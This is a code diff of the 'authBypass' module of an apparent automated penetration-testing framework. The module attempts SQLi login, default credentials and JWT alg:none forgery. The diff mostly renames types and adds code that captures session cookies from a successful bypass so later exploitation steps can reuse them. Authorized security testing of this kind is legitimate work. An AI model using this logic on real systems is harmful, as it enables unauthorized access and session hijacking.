@@ -11,11 +11,11 @@
  * and absence of error markers => authentication bypass confirmed.
  */
 import type {
-  AttackPrimitive,
+  TechniquePrimitive,
+  TechniqueContext,
   PrimitiveResult,
   StepExecutionResult,
-  PrimitiveGenerateInput,
-} from './types'
+} from './framework'
 import { EvidenceGate } from '../intelligence/evidence-gate'
 import { claimFor, assessAccess } from './framework'
 import { isAuthEndpoint, hasTarget } from './routing'
@@ -55,6 +55,24 @@ function forgeAlgNone(token: string): string | null {
   return `${header}.${payload}.`
 }
 
+function metaKind(r: StepExecutionResult): 'login' | 'jwt-forgery' | 'default-creds' {
+  const technique = (r.step.metadata as AuthStepMeta | undefined)?.technique
+  if (technique === 'jwt-none') return 'jwt-forgery'
+  if (technique === 'default-creds') return 'default-creds'
+  return 'login'
+}
+
+function hashCreds(body?: string): string | undefined {
+  if (!body) return undefined
+  try {
+    const h = require('node:crypto').createHash('sha256')
+    h.update(body)
+    return h.digest('hex').slice(0, 16)
+  } catch {
+    return undefined
+  }
+}
+
 function successSignal(res: StepExecutionResult): boolean {
   // Status-authoritative: a 2xx/3xx with a session cookie, a non-login
   // redirect, or any success marker counts as granted; a denial page (401/403
@@ -71,19 +89,15 @@ function successSignal(res: StepExecutionResult): boolean {
   return a.granted && !a.denied
 }
 
-export const authBypass: AttackPrimitive = {
+export const authBypass: TechniquePrimitive = {
   id: 'authBypass',
   name: 'Authentication Bypass',
   description:
     'Attempts authentication bypass via SQLi login, default credentials, and JWT alg:none forgery.',
-  severity: 'critical',
-  category: 'auth',
   technique: 'AUTHN_BYPASS',
-  tags: ['auth', 'sqli', 'jwt', 'default-creds'],
-  references: ['OWASP A07:2021', 'CWE-287', 'CWE-798'],
   appliesTo: (ctx) =>
     hasTarget(ctx) && isAuthEndpoint(ctx),
-  generate(input: PrimitiveGenerateInput) {
+  generate(input: TechniqueContext) {
     const url = input.endpoint?.url ?? input.target!
     const param = input.param ?? input.endpoint?.params?.[0]?.name
     const method = input.endpoint?.method ?? 'POST'
@@ -148,7 +162,7 @@ export const authBypass: AttackPrimitive = {
     let winning: StepExecutionResult | undefined
 
     for (const r of results) {
-      const meta = r.step.metadata as AuthStepMeta
+      const meta = r.step.metadata as unknown as AuthStepMeta
       if (successSignal(r)) {
         hit = true
         if (!winning) winning = r
@@ -160,7 +174,7 @@ export const authBypass: AttackPrimitive = {
               ? 'Auth bypass via JWT alg:none'
               : 'Auth bypass via SQLi login'
         evidence.push({
-          kind: 'session',
+          kind: 'state',
           label: `${label} [${r.step.request.method} ${r.step.request.url} → ${r.status}]`,
           data: (r.body ?? '').slice(0, 1200),
         })
@@ -171,6 +185,29 @@ export const authBypass: AttackPrimitive = {
       claimFor('auth_bypass', results[0]?.step.request.url, results[0]?.status, results[0]?.step.request.method),
     )
     const confirmed = hit && verified
+
+    // W2 — recover the live session so it can be persisted (AUTH_FLOW,
+    // reusable) and reused by the exploitation loop to pivot in-scope.
+    let sessionArtifact: PrimitiveResult['sessionArtifact']
+    if (confirmed && winning) {
+      const setCookie = String(
+        winning.headers?.['set-cookie'] ?? winning.headers?.['Set-Cookie'] ?? '',
+      )
+      const cookie = setCookie
+        .split(/,(?=[^ ])/)
+        .map((c) => c.split(';')[0])
+        .filter(Boolean)
+        .join('; ')
+      if (cookie) {
+        sessionArtifact = {
+          flowType: metaKind(winning),
+          reusable: true,
+          headers: { ...winning.step.request.headers, cookie },
+          credentialHash: hashCreds(winning.step.request.body),
+        }
+      }
+    }
+
     const proof =
       confirmed && winning
         ? {
@@ -195,6 +232,7 @@ export const authBypass: AttackPrimitive = {
           }
         : undefined,
       exploitProof: proof,
+      sessionArtifact,
       note: `hit=${hit} verified=${verified} techniques=${techniques.join(',')}`,
     }
   },
